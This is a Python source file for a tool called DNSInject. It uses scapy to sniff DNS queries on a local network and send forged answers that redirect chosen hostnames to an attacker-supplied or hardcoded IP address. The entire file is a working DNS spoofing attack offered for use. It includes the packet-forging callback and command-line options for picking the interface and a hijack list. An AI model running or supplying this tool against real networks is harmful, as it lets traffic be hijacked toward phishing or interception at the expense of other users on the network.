import argparse
from scapy.all import *

hostnames = None


def pkt_callback(pkt):
	global hostnames

	if pkt.haslayer('DNSQR'):
		print "\n\n\n\nNew Packet\n\n"
		pkt.summary()  # debug statement
		victim = pkt['DNSQR'].qname
		victim = victim.rstrip('.')
		redirect_to = ''
		host_dict = {}
		
		# Hostnames are given
		if hostnames and os.path.exists(str(hostnames)):
			with open(str(hostnames), 'rt') as f:
				hostnames = f.readlines()

			for h in hostnames:
				h = h.split()
				host_dict[h[1]] = h[0]

			print host_dict
			if victim in host_dict:
				redirect_to = host_dict[victim]
			else:
				return
		# Hostnames not given
		else:
			redirect_to = '172.24.16.92'  ## Local ip address

		spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)/UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)/DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa = 1, qr=1, an=DNSRR(rrname=pkt[DNS].qd.qname,  ttl=10, rdata=redirect_to))
		send(spoofed_pkt)
		print spoofed_pkt.summary()


		print "\n********************"
	# def dns_spoof(pkt):

def arg_parser():
	parser = argparse.ArgumentParser(
	 add_help=False,
	 description=
	 "DNSInject is a tool for modifying DNS records on vulnerable servers.")
	parser.add_argument(
	 "-i",
	 nargs="?",
	 metavar="eth0",
	 help="Name if the network interface to listen on.")
	parser.add_argument(
	 "-h",
	 nargs="?",
	 metavar="hostnames.txt",
	 help=
	 "Name of a file with list of IP address and hostname pairs specifying the hostnames to be hijacked."
	)
	parser.add_argument("expression", nargs="*", action="store")
	parser.add_argument(
	 '-?', '-help', '--help', action="store_true", help=argparse.SUPPRESS)

	args = parser.parse_args()

	if args.help:
		parser.print_help()
		sys.exit()

	return args.i, args.h, args.expression


def main():
	global hostnames

	interface, hostnames, bpf_filter = arg_parser()

	if hostnames:
		# hostnames = ''.join(hostnames)
		print hostnames

	if bpf_filter:
		bpf_filter = ' '.join(bpf_filter)
		print bpf_filter
	else:
		bpf_filter = "udp"
		
	if interface:
		# interface = args.i
		print interface
		sniff(iface=interface, prn=pkt_callback, filter=bpf_filter, store=0)
	else:
		print "Choosing default interface"
		sniff(prn=pkt_callback, filter=bpf_filter, store=0)

if __name__ == '__main__':
	main()
